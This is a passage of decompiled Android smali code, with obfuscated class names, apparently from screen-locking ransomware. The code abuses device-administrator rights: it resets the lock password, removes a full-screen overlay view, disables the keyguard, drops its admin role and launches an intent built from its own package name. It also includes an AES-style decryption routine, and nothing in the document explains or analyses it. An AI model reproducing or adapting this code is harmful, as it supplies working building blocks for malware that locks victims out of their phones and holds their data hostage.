    move-exception v0

    goto/16 :goto_1

    :cond_8
    move-object v3, v1

    goto/16 :goto_4
.end method

.method protected b(Ljava/lang/Void;)V
    .locals 6

    const/16 v5, 0x18

    const/4 v4, 0x1

    invoke-super {p0, p1}, Landroid/os/AsyncTask;->onPostExecute(Ljava/lang/Object;)V

    iget-boolean v0, p0, Lzvy/zpfypq/bbuhtkwvaf/b;->c:Z

    if-nez v0, :cond_1

    sget-object v0, Lzvy/zpfypq/bbuhtkwvaf/a;->e:Landroid/content/Context;

    sget-object v1, Lzvy/zpfypq/bbuhtkwvaf/b;->a:[Ljava/lang/String;

    const/16 v2, 0x16

    aget-object v1, v1, v2

    invoke-virtual {v0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/admin/DevicePolicyManager;

    :try_start_0
    sget-object v1, Lzvy/zpfypq/bbuhtkwvaf/IlIllLllIIIllIIlIIlIIlLIIllllIllLlIlLIllllllIlllIlIlllIl;->f:Landroid/view/WindowManager;

    sget-object v2, Lzvy/zpfypq/bbuhtkwvaf/IlIllLllIIIllIIlIIlIIlLIIllllIllLlIlLIllllllIlllIlIlllIl;->x:Landroid/view/View;

    invoke-interface {v1, v2}, Landroid/view/WindowManager;->removeView(Landroid/view/View;)V

    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    if-ge v1, v5, :cond_0

    const-string v1, ""

    const/4 v2, 0x0

    invoke-virtual {v0, v1, v2}, Landroid/app/admin/DevicePolicyManager;->resetPassword(Ljava/lang/String;I)Z

    :cond_0
    sget-object v1, Lzvy/zpfypq/bbuhtkwvaf/a;->e:Landroid/content/Context;

    sget-object v2, Lzvy/zpfypq/bbuhtkwvaf/b;->a:[Ljava/lang/String;

    const/16 v3, 0x10

    aget-object v2, v2, v3

    invoke-virtual {v1, v2}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/app/KeyguardManager;

    sget-object v2, Lzvy/zpfypq/bbuhtkwvaf/b;->a:[Ljava/lang/String;

    const/16 v3, 0x13

    aget-object v2, v2, v3

    invoke-virtual {v1, v2}, Landroid/app/KeyguardManager;->newKeyguardLock(Ljava/lang/String;)Landroid/app/KeyguardManager$KeyguardLock;

    move-result-object v1

    invoke-virtual {v1}, Landroid/app/KeyguardManager$KeyguardLock;->disableKeyguard()V

    const/4 v1, 0x0

    invoke-static {v1}, Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;->a(Z)V

    const/4 v1, 0x1

    invoke-static {v1}, Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;->a(Z)V

    new-instance v1, Landroid/content/ComponentName;

    sget-object v2, Lzvy/zpfypq/bbuhtkwvaf/a;->e:Landroid/content/Context;

    const-class v3, Lzvy/zpfypq/bbuhtkwvaf/IlIlILlIILIllIllllIllllIlllIlllllIIlIIlIlllILlIllIIIllLl;

    invoke-direct {v1, v2, v3}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v0, v1}, Landroid/app/admin/DevicePolicyManager;->removeActiveAdmin(Landroid/content/ComponentName;)V

    new-instance v0, Landroid/content/Intent;

    sget-object v1, Lzvy/zpfypq/bbuhtkwvaf/b;->a:[Ljava/lang/String;

    const/16 v2, 0x17

    aget-object v1, v1, v2

    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    const/high16 v1, 0x10000000

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v2, Lzvy/zpfypq/bbuhtkwvaf/b;->a:[Ljava/lang/String;

    const/16 v3, 0x1f

    aget-object v2, v2, v3

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    sget-object v2, Lzvy/zpfypq/bbuhtkwvaf/a;->e:Landroid/content/Context;

    invoke-virtual {v2}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/content/Intent;->setData(Landroid/net/Uri;)Landroid/content/Intent;

    sget-object v1, Lzvy/zpfypq/bbuhtkwvaf/a;->e:Landroid/content/Context;

    invoke-virtual {v1, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_2

    :goto_0
    const-string v0, ""

    iput-object v0, p0, Lzvy/zpfypq/bbuhtkwvaf/b;->g:Ljava/lang/String;

    invoke-virtual {p0}, Lzvy/zpfypq/bbuhtkwvaf/b;->a()J

    move-result-wide v0

    iput-wide v0, p0, Lzvy/zpfypq/bbuhtkwvaf/b;->j:J

    iget-wide v0, p0, Lzvy/zpfypq/bbuhtkwvaf/b;->j:J

    iget-wide v2, p0, Lzvy/zpfypq/bbuhtkwvaf/b;->m:J

    sub-long/2addr v0, v2

    iput-wide v0, p0, Lzvy/zpfypq/bbuhtkwvaf/b;->l:J

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v1, Lzvy/zpfypq/bbuhtkwvaf/b;->a:[Ljava/lang/String;

    const/16 v2, 0xb

    aget-object v1, v1, v2

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    iget-wide v1, p0, Lzvy/zpfypq/bbuhtkwvaf/b;->l:J

    invoke-virtual {v0, v1, v2}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v0

    sget-object v1, Lzvy/zpfypq/bbuhtkwvaf/b;->a:[Ljava/lang/String;

    const/16 v2, 0xc

    aget-object v1, v1, v2

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    iget-wide v1, p0, Lzvy/zpfypq/bbuhtkwvaf/b;->m:J

    invoke-virtual {v0, v1, v2}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v0

    sget-object v1, Lzvy/zpfypq/bbuhtkwvaf/b;->a:[Ljava/lang/String;

    aget-object v1, v1, v5

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    iget-wide v1, p0, Lzvy/zpfypq/bbuhtkwvaf/b;->j:J

    invoke-virtual {v0, v1, v2}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    :try_start_1
    iget-object v1, p0, Lzvy/zpfypq/bbuhtkwvaf/b;->k:Ljava/lang/String;

    invoke-virtual {v1}, Ljava/lang/String;->length()I

    move-result v1

    if-lez v1, :cond_3

    iget-boolean v1, p0, Lzvy/zpfypq/bbuhtkwvaf/b;->c:Z
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    if-eqz v1, :cond_2

    sget-object v1, Lzvy/zpfypq/bbuhtkwvaf/b;->a:[Ljava/lang/String;

    const/16 v2, 0x1d

    aget-object v1, v1, v2

    iput-object v1, p0, Lzvy/zpfypq/bbuhtkwvaf/b;->h:Ljava/lang/String;

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v2, Lzvy/zpfypq/bbuhtkwvaf/b;->a:[Ljava/lang/String;

    const/16 v3, 0x1b

    aget-object v2, v2, v3

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    iget-object v2, p0, Lzvy/zpfypq/bbuhtkwvaf/b;->k:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lzvy/zpfypq/bbuhtkwvaf/b;->g:Ljava/lang/String;

    iget-object v0, p0, Lzvy/zpfypq/bbuhtkwvaf/b;->g:Ljava/lang/String;

    sget-object v1, Lzvy/zpfypq/bbuhtkwvaf/b;->a:[Ljava/lang/String;

    const/16 v2, 0xd

    aget-object v1, v1, v2

    invoke-virtual {p0, v0, v1}, Lzvy/zpfypq/bbuhtkwvaf/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    new-instance v0, Lzvy/zpfypq/bbuhtkwvaf/r;

    invoke-static {}, Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;->a()Landroid/content/Context;

    move-result-object v1

    invoke-direct {v0, v1}, Lzvy/zpfypq/bbuhtkwvaf/r;-><init>(Landroid/content/Context;)V

    sget-object v1, Lzvy/zpfypq/bbuhtkwvaf/b;->a:[Ljava/lang/String;

    const/16 v2, 0xe

    aget-object v1, v1, v2

    invoke-virtual {v0, v1, v4}, Lzvy/zpfypq/bbuhtkwvaf/r;->a(Ljava/lang/String;Z)V

    sget-object v1, Lzvy/zpfypq/bbuhtkwvaf/b;->a:[Ljava/lang/String;

    const/16 v2, 0x1e

    aget-object v1, v1, v2

    invoke-virtual {v0, v1}, Lzvy/zpfypq/bbuhtkwvaf/r;->a(Ljava/lang/String;)V

    sget-object v1, Lzvy/zpfypq/bbuhtkwvaf/b;->a:[Ljava/lang/String;

    const/16 v2, 0x20

    aget-object v1, v1, v2

    iget v2, p0, Lzvy/zpfypq/bbuhtkwvaf/b;->e:I

    invoke-static {v2}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v1, v2}, Lzvy/zpfypq/bbuhtkwvaf/r;->a(Ljava/lang/String;Ljava/lang/String;)V

    :goto_1
    return-void

    :catch_0
    move-exception v0

    throw v0

    :cond_1
    invoke-virtual {p0}, Lzvy/zpfypq/bbuhtkwvaf/b;->a()V

    goto/16 :goto_0

    :cond_2
    sget-object v1, Lzvy/zpfypq/bbuhtkwvaf/b;->a:[Ljava/lang/String;

    const/16 v2, 0x1a

    aget-object v1, v1, v2

    iput-object v1, p0, Lzvy/zpfypq/bbuhtkwvaf/b;->h:Ljava/lang/String;

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v2, Lzvy/zpfypq/bbuhtkwvaf/b;->a:[Ljava/lang/String;

    const/16 v3, 0x15

    aget-object v2, v2, v3

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    iget-object v2, p0, Lzvy/zpfypq/bbuhtkwvaf/b;->k:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lzvy/zpfypq/bbuhtkwvaf/b;->g:Ljava/lang/String;

    iget-object v0, p0, Lzvy/zpfypq/bbuhtkwvaf/b;->g:Ljava/lang/String;

    sget-object v1, Lzvy/zpfypq/bbuhtkwvaf/b;->a:[Ljava/lang/String;

    const/16 v2, 0x19

    aget-object v1, v1, v2

    invoke-virtual {p0, v0, v1}, Lzvy/zpfypq/bbuhtkwvaf/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_1

    :cond_3
    :try_start_2
    iget-boolean v1, p0, Lzvy/zpfypq/bbuhtkwvaf/b;->c:Z

    if-eqz v1, :cond_4

    sget-object v1, Lzvy/zpfypq/bbuhtkwvaf/b;->a:[Ljava/lang/String;

    const/16 v2, 0x12

    aget-object v1, v1, v2

    iput-object v1, p0, Lzvy/zpfypq/bbuhtkwvaf/b;->h:Ljava/lang/String;

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v2, Lzvy/zpfypq/bbuhtkwvaf/b;->a:[Ljava/lang/String;

    const/16 v3, 0x11

    aget-object v2, v2, v3

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lzvy/zpfypq/bbuhtkwvaf/b;->g:Ljava/lang/String;

    iget-object v0, p0, Lzvy/zpfypq/bbuhtkwvaf/b;->g:Ljava/lang/String;

    sget-object v1, Lzvy/zpfypq/bbuhtkwvaf/b;->a:[Ljava/lang/String;

    const/16 v2, 0xa

    aget-object v1, v1, v2

    invoke-virtual {p0, v0, v1}, Lzvy/zpfypq/bbuhtkwvaf/b;->a(Ljava/lang/String;Ljava/lang/String;)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    goto :goto_1

    :catch_1
    move-exception v0

    throw v0

    :cond_4
    sget-object v1, Lzvy/zpfypq/bbuhtkwvaf/b;->a:[Ljava/lang/String;

    const/16 v2, 0x1c

    aget-object v1, v1, v2

    iput-object v1, p0, Lzvy/zpfypq/bbuhtkwvaf/b;->h:Ljava/lang/String;

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v2, Lzvy/zpfypq/bbuhtkwvaf/b;->a:[Ljava/lang/String;

    const/16 v3, 0x14

    aget-object v2, v2, v3

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lzvy/zpfypq/bbuhtkwvaf/b;->g:Ljava/lang/String;

    iget-object v0, p0, Lzvy/zpfypq/bbuhtkwvaf/b;->g:Ljava/lang/String;

    sget-object v1, Lzvy/zpfypq/bbuhtkwvaf/b;->a:[Ljava/lang/String;

    const/16 v2, 0xf

    aget-object v1, v1, v2

    invoke-virtual {p0, v0, v1}, Lzvy/zpfypq/bbuhtkwvaf/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_1

    :catch_2
    move-exception v0

    goto/16 :goto_0
.end method

.method public b([B[B)[B
    .locals 4

    new-instance v0, Ljavax/crypto/spec/SecretKeySpec;

    const/4 v1, 0x0

    array-length v2, p1

    iget-object v3, p0, Lzvy/zpfypq/bbuhtkwvaf/b;->f:Ljava/lang/String;

    invoke-direct {v0, p1, v1, v2, v3}, Ljavax/crypto/spec/SecretKeySpec;-><init>([BIILjava/lang/String;)V

    sget-object v1, Lzvy/zpfypq/bbuhtkwvaf/b;->a:[Ljava/lang/String;

    const/4 v2, 0x3

    aget-object v1, v1, v2

    invoke-static {v1}, Ljavax/crypto/Cipher;->getInstance(Ljava/lang/String;)Ljavax/crypto/Cipher;

    move-result-object v1

    const/4 v2, 0x2

    invoke-virtual {v1, v2, v0}, Ljavax/crypto/Cipher;->init(ILjava/security/Key;)V

    invoke-virtual {v1, p2}, Ljavax/crypto/Cipher;->doFinal([B)[B

    move-result-object v0

    return-object v0
.end method

.method protected synthetic doInBackground([Ljava/lang/Object;)Ljava/lang/Object;
    .locals 1

    check-cast p1, [[B

    invoke-virtual {p0, p1}, Lzvy/zpfypq/bbuhtkwvaf/b;->b([[B)Ljava/lang/Void;

    move-result-object v0

    return-object v0
.end method

.method protected synthetic onPostExecute(Ljava/lang/Object;)V
    .locals 0

    check-cast p1, Ljava/lang/Void;

    invoke-virtual {p0, p1}, Lzvy/zpfypq/bbuhtkwvaf/b;->b(Ljava/lang/Void;)V

    return-void
.end method

.method protected onPreExecute()V
    .locals 3

    new-instance v0, Lzvy/zpfypq/bbuhtkwvaf/r;

    invoke-static {}, Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;->a()Landroid/content/Context;

    move-result-object v1

    invoke-direct {v0, v1}, Lzvy/zpfypq/bbuhtkwvaf/r;-><init>(Landroid/content/Context;)V

    sget-object v1, Lzvy/zpfypq/bbuhtkwvaf/b;->a:[Ljava/lang/String;

    const/4 v2, 0x2

    aget-object v1, v1, v2

    invoke-virtual {v0, v1}, Lzvy/zpfypq/bbuhtkwvaf/r;->a(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_0

    const/4 v0, 0x0

    iput-boolean v0, p0, Lzvy/zpfypq/bbuhtkwvaf/b;->c:Z

    :cond_0
    return-void
.end method
